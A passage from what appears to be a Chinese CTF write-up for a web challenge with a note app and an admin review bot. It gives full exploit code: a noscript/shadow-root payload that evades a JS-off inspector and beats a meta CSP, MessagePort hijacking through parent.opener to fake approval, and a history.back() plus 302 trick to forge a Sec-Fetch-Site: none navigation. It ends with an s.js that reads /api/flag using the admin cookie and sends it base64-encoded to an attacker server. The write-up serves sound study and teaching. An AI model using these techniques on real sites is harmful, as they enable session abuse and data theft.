| 4 | `policy` | 请求头 `Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document` | 需要"由浏览器发起"的顶层导航，攻击者要制造（2.8） |
| 5 | `prepared` | 机器人步骤 4 已执行 | 机器人自动完成 |
| 6 | `approved` | 有人成功调用过 `/complete` | 攻击者要制造（2.7） |
| 7 | `finalized` | 主窗口导航命中过审查页 | 攻击者要制造（2.8） |
| 8 | `!used` | 尚未被消费 | 自动，前七项过了自然满足 |

`approved` 的置位接口 `/complete` 源码：

```javascript
app.post("/complete", (req, res) => {
  const id = String(req.body.id || "");
  const state = String(req.body.state || "");
  if (currentReview && currentReview.id === id
      && currentReview.prepared
      && req.session.admin
      && state === currentReview.nonce) {   // 四项全对才置位；state 需等于 nonce（每轮随机生成、绑定本轮记录，且由审批页面打印在页面里，2.7）
    currentReview.approved = true;
  }
  res.type("text/plain").send("ok");
});
```

到这里，攻击的四个问题也就清楚了：

1. **脚本执行问题**：笔记必须先通过 2.2 的检查，再在渲染时执行脚本（服务器输出笔记原文时没有 CSP 头，但笔记自带的 CSP meta 会禁止脚本；要绕过的是后者）。做法：用 noscript 双解析、声明式影子树、DPU 拼一份"检查时是空白文档、渲染时是可执行脚本"的笔记（payload 与推演见 2.2）；
2. **批准问题**：`approved` 需要一次成功的 `/complete` 调用（四项全对），四项里 `admin` 与 `state` 都在机器人手里。做法：笔记脚本把沙箱的 MessagePort 转交给入口页，由入口页冒充"笔记已就绪"，审批页面因此以自身身份调用 `/complete`（步骤与代码见 2.7）；
3. **时机问题**：`policy` 需要一次"由浏览器发起"的顶层导航命中审查页 `/reports/check`；而这次命中本身就会被 `watchDocument` 用来置位 `finalized`（判定式 `finalized = approved && !diverged`，见 2.5.3）。做法：入口页、弹窗、helper 三页配合，制造一次浏览器发起的回退导航（先 `about:blank`，再 `history.back()`），经你自己的服务器 302 落到审查页（序列与代码见 2.8）；
4. **外传问题**：flag 进了页面之后怎么送出来。做法：笔记在审查页顶层再被渲染一次，其中引用的脚本 `https://你的服务器/s.js` 随之再次加载执行（笔记本身只有 `<script src=…/s.js>` 引用，没有内联代码）；`s.js` 里用 `fetch('/api/flag')` 向这个接口要数据（脚本运行在挑战域页面上，`/api/flag` 与它同源，请求会自动带上管理员 cookie），拿到的内容经 base64 编码后拼进你自己的服务器 URL，靠窗口跳转把数据带出去（`s.js` 全文见 2.9）。

2.6 到 2.9 依次解决（按时间顺序），每段给出做法、代码与本地验证。

#### 2.5.3 步骤 5：watchDocument 的监听规则

步骤 5 访问提交的网址后，`watchDocument` 开始监听这个主窗口的每一次导航。三个函数与逐行注释如下（`bot.js`）：

```javascript
/**
 * 生成地址比较键：判断两个地址是否指向同一个文档目标。
 *
 * 归一化规则：
 * - 用 new URL(value) 按 WHATWG 规则解析地址：
 *   - 协议、主机名转小写；
 *   - 去掉默认端口，如 http:80、https:443；
 *   - 解析路径中的 "." 和 ".."；
 *   - 对需要编码的字符做百分号编码。
 * - 清空 url.hash：
 *   - #片段不参与文档加载，只用于页内定位；
 *   - 只差 #片段的两个地址，应视为同一个文档目标。
 * - 返回 url.href，作为归一化后的完整地址字符串。
 *
 * 示例：
 *   HTTP://Host.Docker.Internal:8000/a/../b?x=1#frag
 *   -> http://host.docker.internal:8000/b?x=1
 *
 * 注意：
 * - 只接受绝对 URL；相对地址需要传 base，否则 new URL 会抛错。
 * - 查询参数不会排序，?a=1&b=2 和 ?b=2&a=1 会得到不同键。
 * - 路径大小写敏感，/A 和 /a 不会归一成同一个键。
 * - 协议、主机、端口、路径、查询参数不同，仍视为不同文档目标。
 */
function locationKey(value) {
  const url = new URL(value);
  url.hash = "";
  return url.href;
}

function isReportDocument(value, report) {
  // 要检查的地址
  const url = new URL(value);

  // 应用本身的地址（比如 http://localhost:3000）
  const app = new URL(APP_URL);

  // 必须同时满足三个条件，才算当前审查的审查页：
  return (
    // 1. 同一个源（协议、主机、端口都一样）
    url.origin === app.origin
    // 2. 路径正好是 /reports/check
    && url.pathname === "/reports/check"
    // 3. 查询参数 rid 等于本次审查的 id
    && url.searchParams.get("rid") === report.id
  );
}

function watchDocument(page, report, entryUrl) {
  // 入口地址归一化，方便后面比较，入口链接是你通过 `/report` 接口传入的需要审查目标链接
  const entry = locationKey(entryUrl);

  // 有没有到过入口
  let entered = false;

  // 到过入口之后，有没有跑偏到别的地址
  let diverged = false;

  // 监听这个页面的所有请求
  page.on("request", (request) => {
    // 只看主窗口的导航请求，其他（图片、iframe、脚本）都不管
    if (!request.isNavigationRequest() || request.frame() !== page.mainFrame()) {
      return;
    }

    // 这次导航要去哪
    const next = request.url();

    // 还没到过入口：这次是不是入口？
    if (!entered) {
      entered = locationKey(next) === entry;

      // 如果这次不是入口，先记成跑偏；但后面一旦到了入口，会把它改回来
      diverged = !entered;

      // 没到入口之前，不往下判断
      return;
    }

    // 已经到过入口了：这次是不是审查页 `/reports/check` ？
    if (isReportDocument(next, report)) {
      // 审查通过，并且到入口后没跑偏，才算最终确认
      // （机器人不会主动把主窗口导航到审查页：这里是 finalized 唯一被置真的地方，触发它的是攻击者制造的导航，见 2.8）
      report.finalized = report.approved && !diverged;
      return;
    }

    // 既不是审查页，也不是入口，那就是跑到别的地方去了
    if (locationKey(next) !== entry) {
      diverged = true;
      report.finalized = false;
    }
  });
}
```

### 2.6 攻击第 1 段：入口页打开审批页面

机器人第 5 步到达入口页（第一次访问）。这个页面就是你自己的服务器 `/` 路由第一次访问时返回的内容（2.3 表中 `/` 一行），完整代码如下：

```html
<!doctype html>
<script>
const q = new URLSearchParams(location.search);
const i = q.get("rid");                                        // 机器人追加的本轮编号
const w = open("http://localhost:3000/review?rid=" + i);       // 第一段：打开审批页面（弹窗，本节；w 就是打开的新窗口）

// onmessage 是注册"消息处理器"：窗口收到 postMessage 消息时，浏览器自动调用它（不用手动调用）；
// e.ports[0] 就是消息里转交来的端口，是一个 MessagePort 对象（不是网络端口那种数字）
onmessage = e => {                                             // 第二段（2.7）：收到沙箱转交的端口
  const port = e.ports[0];
  if (!port) return;                                           // 不是带端口的消息就忽略
  port.postMessage("ready");                                   // 冒充"笔记已就绪"
  setTimeout(() => {                                           // 第三段（2.8）：回退序列
    w.location = "/helper";                                    // 弹窗换到你自己服务器的 /helper 页（为什么转到你自己的服务器：见 2.8.1）
    setTimeout(() => location = "about:blank", 250);           // 主窗口离开入口网址（写入历史记录）
  }, 500);
};
</script>
```

这份脚本按执行时间分三段（注释里标了对应节）：加载时第一段；收到沙箱转交的端口后第二段（2.7）；`setTimeout` 里的回退序列第三段（2.8）。

先看第一段：这次 `open` 是一次顶层导航，打开的页面就是审批页面。

#### 2.6.1 为什么这次打开的审批页面带着管理员会话

`/complete` 需要管理员会话（源码见 2.5.2），而审批页面一打开就带着管理员会话。原因就在 `open` 这次导航本身：

`open` 发出的是**顶层导航**（浏览器在新窗口里加载一个文档）。`SameSite=Lax` 的 cookie 规则是：跨站请求默认不带 cookie，但**顶层导航例外**。机器人登录后种在 `localhost:3000` 的管理员会话 cookie 因此在这次导航中被发送，审批页面一打开就带着管理员会话。它后续对 `/complete` 的 `fetch` 是同源请求，同样带着会话（2.7 会用到这一点）。

#### 2.6.2 审批页面自身的代码与消息通道

`/review` 路由（服务器端）在 `rid` 匹配时渲染审批页面模板 `review.ejs` 。模板里与攻击相关的部分：

```html
<iframe id="viewer" sandbox="allow-scripts"
        src="/sandbox?rid=<%= encodeURIComponent(id) %>"></iframe>
<script nonce="<%= nonce %>">
  const viewer = document.getElementById("viewer");
  const report = <%- JSON.stringify({ id, state }) %>;      // id 与 state 印在页面脚本里

  // 沙箱 iframe 加载完成后：建立消息通道并把一端交给沙箱；收到 ready 后调用批准接口（2.7）
  viewer.addEventListener("load", () => {
    const channel = new MessageChannel();
    channel.port1.onmessage = async (event) => {
      if (event.data !== "ready") return;                    // 收到 "ready" 才继续
      channel.port1.close();
      await fetch("/complete", {                             // 用审批页面自身的身份调用批准接口
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(report),
      });
    };
    viewer.contentWindow.postMessage("render", "*", [channel.port2]);   // 把通道的一头发给沙箱
  }, { once: true });
</script>
```

这段逻辑要做的事：等沙箱 iframe 加载完成后，建立一个消息通道，把通道的其中一头（port2）交给沙箱里的笔记；等通道另一头（port1）收到字符串 `"ready"` 时，就用当前页面的身份请求 `/complete`。

`MessageChannel` 的机制（理解这一步需要的全部内容）：

- `new MessageChannel()` 创建一对互相连通的消息端口；两端是 `MessagePort` **对象**（不是网络端口那种数字），用自带的 `postMessage()` 发消息、`onmessage` 收消息。本文分别称端口 A（port1）与端口 B（port2）；
- `onmessage = 函数`（或 `端口.onmessage = 函数`）是注册"消息处理器"：窗口或端口收到消息时，浏览器自动调用它。代码里看不到显式调用点，这是正常写法；
- 只有持有端口 B 的一方才能给端口 A 发消息；用普通的 `window.postMessage` 无法给端口发消息；
- `postMessage(消息, 目标, [端口])` 的第三个参数可以把端口**转移**给另一个窗口；转移后原持有者不能再使用该端口。转移允许跨源；
- 端口 A 的持有者（审批页面）**无法验证消息实际由谁发出**，它只认"端口 B 送来的消息"。

到这里审批页面已加载完成。下面看笔记被渲染的这一步：谁在渲染、怎么被渲染的。审批页面的模板里有 `<iframe sandbox="allow-scripts" src="/sandbox?rid=<rid>"></iframe>`（2.6.2 的模板代码）；iframe 发出 `GET /sandbox`，`src/server.js` 的 `/sandbox` 路由校验通过后，把笔记原文原样发给它：

```javascript
app.get("/sandbox", (req, res) => {
  if (
    !reviewMatches(req)
    || !currentReview.prepared
    || !req.session.admin
  ) {
    res.status(404).type("text/plain").send("not found");
    return;
  }

  const note = notes.get(currentReview.noteId);
  if (!note) {
    res.status(404).type("text/plain").send("not found");
    return;
  }

  res.setHeader(
    "Content-Security-Policy",
    "sandbox allow-scripts; base-uri 'none'; frame-ancestors 'self'"
  );
  res.type("html").send(note.html);   // 笔记原文在这里被原样发给 iframe
});
```

iframe 里的浏览器（机器人的无头 Chromium：JavaScript 开启，能正常联网）收到这份笔记并解析。这次解析和检查器那次完全不同，逐步推演见 2.6.3 节。

#### 2.6.3 沙箱加载笔记：渲染器视角逐步推演

链路回顾：我们通过 `/report` 把入口页地址提交给机器人，入口页主动打开审批页面 `/review`，它返回 `review.ejs` 模板渲染后的 HTML 页面，这个页面里面的 iframe 会调用 `/sandbox` 接口返回笔记的 HTML 代码，这个代码就是我们的攻击代码。

回顾笔记 HTML 代码，它是攻击内容：

```html
<!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript><a alt="</noscript></template><script src=https://你的服务器/s.js></script>">x</a></noscript></template></div><template for=c><meta content="default-src 'none'"http-equiv=content-security-policy></template>
```

**渲染器会运行 JS，从它的视角逐步推演：**
1. 到解析 `<template shadowrootmode=open>` 为止与 2.2.1 相同（div + 影子根已创建）；
2. `<noscript>` → JS 开启：内容按原始文本处理，解析器不做标签解析，只查找字符串 `</noscript>`；
3. 第一个 `</noscript>` 出现在 `alt` 引号内部（字符串 `<a alt="` 之后）：这里 `<noscript>` 与它成为一对、noscript 提前闭合，内容只是文本 `<a alt="`；引号里的 `<script>` 此时还没被当作标签，下一步它就会成为真元素；
4. `</template>` → 影子根内容插入结束；
5. `<script src=.../s.js>` → **成为真实元素**（插入 div 的普通子树）：同一段文本，JS 关闭时它只是 `alt` 属性值里的字符串，JS 开启时则成为真实标签；外部脚本是"解析阻塞"的，浏览器会立即加载并执行它。跨源加载本身不受限制：同源策略限制的是"读取"跨源响应的内容，不限制"加载"跨源脚本（否则 CDN 上的 JS 就无法被引用）；
6. **执行时刻的关键**：此时文档还没解析到末尾的 template，**head 里还没有 meta，页面没有任何 CSP 生效**，脚本顺利加载运行。能拦住脚本的只有 CSP，而这道题的两处 CSP 都拦不到它：`/sandbox` 的响应头 CSP 是 `sandbox allow-scripts; base-uri 'none'; frame-ancestors 'self'`，没有 `script-src` 一类限制脚本加载的指令；审查页第二次访问则根本没有 CSP 响应头（2.5.2 的处理器只 `send(note.html)`）；
7. `">x` 等剩余字符 → 成为 div 里的文本；后面的 `</a>`、`</noscript>`、`</template>` 此时已经没有配对的开始标签（`<a` 只是文本，noscript 与 template 也已闭合），是多余的结束标签，解析器按 HTML 规范的错误恢复规则直接忽略（不会中断解析，也没有可见报错）；
8. `<template for=c>` → meta 这时才被搬进 head。CSP 只对生效之后的资源加载起作用，而脚本已经执行完毕。

脚本执行后只做一件事：给页面设置一个消息处理函数（浏览器收到发给这个页面的消息时会自动调用它），然后停在这里等消息。沙箱加载完成后，审批页面建立消息通道，把端口 B 装进消息送进沙箱；这个函数收到消息后，把端口 B 再转发给入口页（转发目标是谁：从沙箱里看，`parent` 是包含沙箱的审批页面，`parent.opener` 就是打开审批页面的那个窗口，即入口页；端口最终由入口页使用，发出批准流程要等的 `"ready"`，完整链条与代码见 2.7.1）。与检查器视角的对照：

| 检查项 | 检查器视角（2.2.1） | 渲染器视角（上面） |
|---|---|---|
| head 元素数 | 1（meta，被 DPU 搬入） | 1（meta，但直到解析末尾才出现） |
| body 元素数 | 1（div） | 1（div） |
| div 子元素 | 0（内容在影子树） | 脚本元素是真实存在的 |
| script 元素 | 不存在（只是 alt 属性值里的字符串） | 存在并执行 |
| 执行时 CSP | 不涉及 | 尚未生效（meta 还没进 head） |

#### 2.6.4 可选：单独确认脚本会在渲染时执行

如果想不跑完整条链、先单独确认"笔记里的脚本确实会在渲染时执行"，可以把机器人直接引到 `/review`（由沙箱 iframe 加载笔记）。步骤：

1. 把你自己服务器的 `/s.js` 临时改为一行代码 `fetch('https://你的服务器/hit')`，并加一个记录日志的 `/hit` 路由；
2. 提交 `/report`，网址填 `http://localhost:3000/review?note=<笔记编号>`（机器人会追加 `rid`；机器人浏览器自带管理员会话，`prepared` 也已就位，沙箱可以正常加载笔记），或跳过这个验证、直接运行第五章的完整脚本；
3. 你自己的服务器收到 `/hit` 请求，即证明脚本在沙箱渲染时执行；验证后把 `/s.js` 改回正式内容（第五章）。

下一段（2.7）就是端口的两次转交与批准。

### 2.7 攻击第 2 段：转交端口与批准

#### 2.7.1 把端口转交出去

正常设计里，端口 B 会被送进沙箱，由笔记脚本在完成"渲染"后回复 `"ready"`。而笔记脚本是攻击者控制的，做法是：**让它把端口 B 再转交给攻击者的入口页，由入口页发 `"ready"`**。端口消息不携带可验证的发送者身份，审批页面无从分辨。

`/s.js` 中负责这一段的代码（完整版本见 2.9）：

```javascript
// 在沙箱（/sandbox）中运行时走这里：收到端口后把它转交给"审批页面的打开者"
// parent.opener 链：沙箱页的父窗口是审批页面 `/review` ；审批页面的 opener 是打开它的入口页（攻击者页面）。
// window.opener 是浏览器提供的窗口引用，允许跨源向它 postMessage；引用得以保留的前提是
// 审批页面没有设置 COOP（本题 helmet 配置 crossOriginOpenerPolicy: false）。
onmessage = e => { if (e.ports[0]) parent.opener.postMessage(0, "*", e.ports); };
```

端口 B 的完整流转路径是：

```
审批页面 `/review` --(postMessage 转移)--> 沙箱 iframe 里的笔记 --(s.js 转交)--> 入口页
```

三条消息，分别进三个收件箱：

| 消息 | 从哪到哪 | 收件人（监听它的地方） |
|---|---|---|
| `"render"`，带端口 B | 审批页面 → 沙箱 iframe 窗口 | 沙箱页面的 `onmessage`（s.js 设置的那段代码） |
| 数据 `0`，带端口 B（转交） | 沙箱页面 → 入口页窗口 | 入口页窗口的 `onmessage`（2.6 的第二段脚本） |
| `"ready"` | 入口页 → 端口 B 的 `postMessage` | 审批页面 `channel.port1.onmessage` |

**读法**：`X.postMessage(...)` 就是把消息投给 X。方法前面的 X 指向谁，消息就进谁那里。

- 沙箱那条 `parent.opener.postMessage(...)`：X 是 `parent.opener`。在沙箱里 `parent` 是审批页面窗口，`opener` 是打开审批页面的那个窗口（入口页），所以这条消息投给入口页，审批页面收不到。
- 审批页面那条 `channel.port1.onmessage`：X 是端口 `port1`，不是窗口。只有从端口 B 发来的消息能到它，也就是表里第三条 `"ready"`；沙箱那条走的是窗口消息（没经过端口），到不了它。

入口页持有端口 B 后，直接发送 `"ready"`：

```javascript
// 入口页脚本的第二段（完整代码见 2.6）：收到端口后回报 ready，触发审批页面的批准流程
onmessage = e => {
  const port = e.ports[0];
  if (!port) return;
  port.postMessage("ready");          // 冒充"笔记已就绪"
  // ...随后进入回退序列（2.8）
};
```

审批页面的端口 A 收到 `"ready"`，于是调用 `/complete`（这段调用写在 2.6.2 展示的审批页面脚本里）。四项条件这时全部为真：`admin`、`id`、`state` 由审批页面自动满足，`prepared` 在机器人步骤 4 已置位。`approved` 被置位。

#### 2.7.2 本地验证

到这一步可以单独验证"批准"环节：在入口页的 `onmessage` 里打印日志、在 `/complete` 的服务器日志里观察 `admin=true match=true` 的行（第四章的日志示例第 4 行）。不需要走完 2.8，就能看到 `approved` 被置位。

### 2.8 攻击第 3 段：回退导航与第二次访问

本节涉及的全部代码，先完整列出（注释直接写在代码里）；后面再逐步展开。

**入口页（完整脚本）**

```html
<!doctype html>
<script>
// 第一段（2.6）：打开审批页面
const q = new URLSearchParams(location.search);
const i = q.get('rid');
const w = open('http://localhost:3000/review?rid=' + i);       // 打开审批页面；w 就是新打开的这个窗口

// 第二段（2.7）：收到沙箱转交的端口后
onmessage = e => {
  const port = e.ports[0];
  if (!port) return;                                          // 不是带端口的消息就忽略
  port.postMessage('ready');                                  // 冒充"笔记已就绪"

  // 第三段（本节）：回退序列
  setTimeout(() => {                                          // "ready" 发出后 500 毫秒
    w.location = '/helper';                                   // 弹窗换到 /helper 页（相对路径按本页网址补全）
    setTimeout(() => location = 'about:blank', 250);          // 再 250 毫秒：主窗口离开入口网址
  }, 500);
};
</script>
```

**`/helper` 页（完整页面）**

```html
<!doctype html>
<script>
// 页面加载 500 毫秒后：让打开它的主窗口做一次历史回退
setTimeout(() => opener.history.back(), 500);
</script>
```

**攻击脚本中你服务器的两段（完整）**（第五章 `do_GET` 中的这两段；入口页以压缩字符串存放，注释标在每一段旁边）

```python
        # 路由 1：入口页。第一次返回带攻击脚本的页面；第二次（历史回退）返回 302
        if parsed.path == "/" and "rid" in query:
            key = parsed.query
            visits[key] = visits.get(key, 0) + 1
            print(f"[CB] entry visit #{visits[key]} rid={query['rid'][0][:10]}", flush=True)
            if visits[key] > 1:                                # 同一入口网址的第 2 次访问（来自历史回退）
                print("[CB] → 302 to /reports/check", flush=True)
                self.send_response(302)
                self.send_header("Location",
                    f"http://localhost:3000/reports/check?rid={query['rid'][0]}")  # 把这次导航送往审查页
                self.end_headers()
                return
            # 第一次访问的页面：开弹窗打开审批页面；收到端口后发送 "ready"，随后转入回退序列
            body = ("<!doctype html><script>"
                    # 第一段：打开审批页面
                    "const q=new URLSearchParams(location.search),"
                    "i=q.get('rid'),w=open('http://localhost:3000/review?rid='+i);"
                    # 第二段：收到沙箱转交的端口后冒充笔记发 "ready"
                    "onmessage=e=>{let p=e.ports[0];if(!p)return;p.postMessage('ready');"
                    # 第三段（本节）：回退序列
                    "setTimeout(()=>{w.location='/helper';"
                    "setTimeout(()=>location='about:blank',250)},500)}</script>").encode()

        # 路由 2：辅助页面。与入口页同源，负责对主窗口执行历史回退
        elif parsed.path == "/helper":
            print("[CB] helper hit → opener.history.back()", flush=True)
            body = (b"<!doctype html><script>"
                    b"setTimeout(()=>opener.history.back(),500)</script>")
```

#### 2.8.1 逐步展开：三个页面怎么配合

三个页面配合完成（角色：机器人主窗口停在入口页，也就是你提交的攻击网页；弹窗是入口页用 `open(...)` 打开的，之后换到你自己服务器的 `/helper` 页；笔记脚本在弹窗的沙箱 iframe 里运行）：

```
① 入口页收到沙箱里的笔记脚本发来的消息（`s.js` 把端口 B 转交给入口页，见 2.7）
   效果：入口页的 onmessage 被触发；先回复 `"ready"`（批准，2.7），再安排 500 毫秒后开始回退

② 500 毫秒后：弹窗被导航到你自己服务器的 /helper 页（弹窗就是开头 `open(...)` 打开的新窗口；`w.location = '/helper'` 换的是它的页，不是入口页）
   效果：弹窗换到攻击者自己的页面（与入口页同源），可以操作主窗口的历史

③ 再过 250 毫秒：入口页（主窗口）执行 location = 'about:blank'（`location` 不带 `w.`，是入口页自己换页；② 没动过入口页，所以它的定时器照常触发）
   效果：主窗口离开入口网址，历史记录变成 [入口网址, about:blank]

④ helper 页加载 500 毫秒后执行 opener.history.back()
   效果：主窗口回退到入口网址，这是一次"由浏览器发起"的导航（浏览器自动给这次请求附上 `Sec-Fetch-Site: none`；页面脚本做的跳转带不了这个值）
   回退本来可能被 BFCache（回退/前进缓存）或 HTTP 缓存直接恢复、一个请求都不发；入口页响应带 `Cache-Control: no-store`（2.3），两种缓存都用不上，所以这里会真的发出一次网络请求（⑤）

⑤ 入口网址的第二次请求到达你自己的服务器（带 Sec-Fetch-Site: none、Sec-Fetch-Dest: document）
   服务器怎么知道是第 2 次：`/` 路由给每个入口网址计数（同一 key 每来一次 `visits[key]` 加一，key 是带 rid 的完整查询串），计数为 2 时走 `visits[key] > 1` 分支；302 只看计数，与请求头无关
   你自己的服务器对第二次访问返回：302 → http://localhost:3000/reports/check?rid=<rid>

⑥ 浏览器跟随 302 请求审查页
   这次请求仍然带 Sec-Fetch-Site: none（该值属于导航本身，不因重定向改变）
   目标 localhost:3000 与 cookie 同站且是顶层导航 → 管理员 cookie 一并发送
   请求头同时满足 检查 4（none + document）与 检查 1（管理员会话）
```

四个细节：

- **`about:blank` 步骤的作用**：主窗口需要先"离开"入口网址，`history.back()` 才有可回退的记录（历史栈变成"入口网址 ← about:blank"，回退即回到入口）。`about:blank` 是一次不产生网络请求的导航，不会干扰机器人的导航监听（见下条）；
- **`/helper` 是什么、弹窗为什么转到它**：`/helper` 是你自己的服务器上的页面（2.3 表）。入口页里写的是 `w.location = '/helper'`，这是一个"没写网址、只写路径"的地址；补全它（把没写的网址部分接上）时，浏览器用的是**执行这行代码的页面**（入口页）的网址，而不是弹窗当时在的网站。入口页的网址就是你自己的服务器，所以补全后指向 `http://host.docker.internal:8000/helper`，弹窗于是从挑战域（审批页面）换到了攻击者自己的服务器上。本地复现日志里的 `[CB] helper hit`（第四章）就是这次访问；
- **为什么 `helper` 能让主窗口回退**：helper 加载在弹窗里，弹窗是主窗口用 `open(...)` 打开的，所以弹窗里的 `opener` 指向主窗口；`opener.history.back()` 读作"主窗口的历史记录退一步"，退的是主窗口（不带 `opener.` 的 `history.back()` 才会退弹窗自己）。能这么操作的前提是两窗口同源：主窗口这时停在 `about:blank`，空白页继承入口页的来源（你自己服务器），和 helper 同源；
- **为什么这次导航恰好设置 `finalized`**：机器人 `watchDocument` 的规则（2.5.3）是"主窗口的导航请求命中审查页 → `finalized = approved && !diverged`"。整个序列里主窗口的导航请求只有三次：入口网址（最初那次访问，记为入口）、回退后再次访问入口网址（与入口相同，不算偏离）、以及 302 之后的审查页请求（命中）。`about:blank` 不产生网络请求，不会被计入。因此 `diverged` 保持为假，命中时 `approved` 已为真（2.7 完成），`finalized` 被置真。

#### 2.8.2 概念展开：Sec-Fetch-Site 是什么

> 一句话说明：检查 4（`policy`）要求请求头 `Sec-Fetch-Site: none`，这个值只会出现在**由浏览器发起**的导航上（页面里的脚本发起的跳转一律带别的值）。历史回退（后退/前进）属于"由浏览器发起"；用一个"入口页先离开原地址、再回退"的序列，就能制造一次真实的、带 `none` 的重新请求，并让它经过 302 落到审查页上。

`Sec-Fetch-*` 系列请求头由浏览器自动附加（Fetch Metadata 机制），标明"这个请求是怎么发起的"。页面脚本无法伪造或修改这些头。`Sec-Fetch-Site` 的取值与含义：

| 取值 | 含义 | 典型来源 |
|---|---|---|
| `same-origin` / `same-site` / `cross-site` | 请求有"发起页面"，按发起页面与目标的站点关系取对应值 | 页面脚本发起的跳转、表单提交、`fetch`、点击链接等 |
| `none` | 请求没有"发起页面"，由浏览器本身发起 | 地址栏输入、点击书签、外部程序打开，以及**历史回退/前进**产生的重新请求 |

对照检查 4 的要求（`Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document`）：请求必须是一次"由浏览器发起的顶层文档导航"。脚本能做出的所有跳转都不满足（`window.open` 新窗口、脚本改 `location`、`location.reload()` 都是顶层文档导航，但发起者是页面脚本，带的是 `cross-site` 或 `same-origin` 之类的值）；**历史回退可以**（回退没有发起页面）。取值取决于**这一次导航**的发起者，与请求哪个网址无关：同一个入口网址，刷新带 `same-origin`，回退带 `none`。

#### 2.8.3 至此八项检查的状态

| # | 检查项 | 状态 | 由哪一步完成 |
|---|---|---|---|
| 1 | 管理员会话 | ✓ | 顶层导航（回退 + 302）自动携带 cookie |
| 2 | rid 匹配 | ✓ | 机器人追加，你自己的服务器原样放进 302 目标 |
| 3 | 笔记存在 | ✓ | 攻击者创建并通过检查（2.2） |
| 4 | `policy`（none + document） | ✓ | 回退产生的浏览器发起导航，经 302 保持 |
| 5 | `prepared` | ✓ | 机器人步骤 4 |
| 6 | `approved` | ✓ | 审批页面调用 `/complete`（2.7） |
| 7 | `finalized` | ✓ | 主窗口导航命中审查页时由 `watchDocument` 置位 |
| 8 | `!used` | ✓ | 首次消费 |

审查页随即输出笔记原文（无 CSP 响应头）。剩下最后一件事：把 flag 送出来。

### 2.9 攻击第 4 段：读取 flag 并外传

> 一句话说明：审查页输出的笔记原文会在挑战域（`http://localhost:3000`）顶层被浏览器渲染，`s.js` 因此再执行一次，这次它执行的是另一个分支（读 flag 的那支）：不做端口转交，直接以同源身份请求 `/api/flag`（管理员 cookie 随请求自动携带），把响应内容发送到你自己的服务器。

**整条链路（笔记原文 → `s.js` 执行）**

**① 笔记原文是创建时存下的**（2.2.1 的 `/create`：检查器关 JS、断网，通过后入库）：

```javascript
if (!(await inspectDocument(html))) {                            // 检查器不放行 → 400
  res.status(400).render("message", { title: "Bad note", message: "Document profile rejected." });
  return;
}

const id = randomId(10);
notes.set(id, {
  id,
  title,
  html,                                                          // 笔记原文
  createdAt: Date.now(),
});
```

**② 第二次访问通过检查后，渲染分支把原文取出、原样发给浏览器**（2.5.2 的 `/reports/check`）：

```javascript
const note = notes.get(currentReview.noteId);                    // 取出笔记原文

if (!policy(req) || !consumeReport(req)) { /* 403 forbidden */ } // 检查 4-8 不满足就拒绝
res.type("html").send(note.html);                                // 通过：原文作为响应正文发出；没有 CSP 头
```

**③ 浏览器把原文当真实文档解析（JS 开着）**，原文里触发加载的是这一行：

```html
<script src=https://你的服务器/s.js></script>
<!-- 检查器那次（JS 关）：这行在 <a alt=" 的引号里，只是属性值里的文字，不加载（检查器看到的是空白文档） -->
<!-- 这次渲染（JS 开）：noscript 内容按原文处理，第一个 </noscript> 落在 alt 引号里 → noscript 提前闭合；
     原本藏在引号里的 <script src=...> 成为真实元素（逐字符推演见 2.6.3） -->
<!-- 外链脚本解析阻塞：成为真实元素的同一刻，浏览器就到你服务器请求 /s.js（跨源加载不受同源策略限制） -->
<!-- 拦它的关卡都不在：响应没有 CSP 头；笔记自带的 meta CSP 排在文档最末尾，解析到它时脚本已经跑完 -->
```

**④ `s.js` 下载回来立即执行**（完整代码，两个分支）：

```javascript
const q = new URLSearchParams(location.search);
const i = q.get("rid");
const C = "https://你的服务器";                      // 你自己的服务器地址

if (location.pathname == "/reports/check") {
  // 分支一：在审查页顶层渲染笔记原文时执行（第一次在沙箱里执行时不是这个分支）
  fetch("/api/flag")                                  // 同源请求，带管理员 cookie
    .then(r => r.text())
    .then(t => location = C + "/flag?x=" + btoa(t));  // 把响应内容 base64 后发往你自己的服务器
} else {
  // 分支二：在沙箱（/sandbox）里执行时走这里，转交消息端口（2.7）
  onmessage = e => { if (e.ports[0]) parent.opener.postMessage(0, "*", e.ports); };
}
```

两个分支由 `location.pathname` 区分：

| 执行位置 | `location.pathname` | 走的分支 |
|---|---|---|
| 审批页面的沙箱 iframe 内（笔记被 `/sandbox` 渲染） | `/sandbox` | 转交端口（2.7） |
| 审查页顶层（笔记原文被原样输出后渲染） | `/reports/check` | 读取 flag 并外传 |

分支一能成功读取 `/api/flag` 的原因：审查页的第二次访问是一次顶层导航，机器人浏览器的管理员 cookie 在当前页面（`localhost:3000`）上有效；`/api/flag` 与当前页面同源，`fetch` 自动携带该 cookie。

外传使用 `btoa(...)` 把响应内容（JSON 文本）编码进 URL 查询参数。这里绕开的是"让数据离开浏览器"的最后一环：浏览器允许页面把当前窗口导航到任意地址，查询参数即数据通道。你自己的服务器收到 `/flag?x=...` 后做一次 base64 解码，取出其中的 flag 值（实现见第五章路由 4）。

### 2.10 攻击链完整时序

把 2.2 到 2.9 里攻击者与机器人的全部动作按时间顺序合在一起（S 表示服务端状态变化，括号内是第四章的日志行）：

| 序 | 发起方 | 动作 | 状态/日志 |
|---|---|---|---|
| 1 | 攻击者 | `POST /create` 提交 2.2.1 的攻击笔记 | 检查通过，得到笔记编号 |
| 2 | 攻击者 | `POST /report`，网址为你自己服务器的入口页地址（带 `note` 参数） | 机器人启动本轮审查 |
| 3 | 机器人 | 步骤 1：访问 `/reports/session` | 管理员会话建立 |
| 4 | 机器人 | 步骤 2：访问审查页（第一次） | `visited = true`（日志①） |
| 5 | 机器人 | 步骤 3：访问 `/api/flag` | flag 存入本轮记录 |
| 6 | 机器人 | 步骤 4：调用 `/reports/arm/<编号>` | `prepared = true` |
| 7 | 机器人 | 步骤 5：访问入口网址（第一次） | 你自己的服务器日志 `entry visit #1` |
| 8 | 入口页 | `window.open` 打开审批页面 | 日志②（`/review`） |
| 9 | 审批页面 | 沙箱 iframe 加载 `/sandbox`，笔记渲染，`s.js` 执行、设置消息处理函数 | 日志③（`/sandbox`） |
| 10 | 审批页面 → 笔记 → 入口页 | 端口两次转移；入口页发送 `"ready"` | 无 |
| 11 | 审批页面 | 调用 `/complete` | `approved = true`（日志④） |
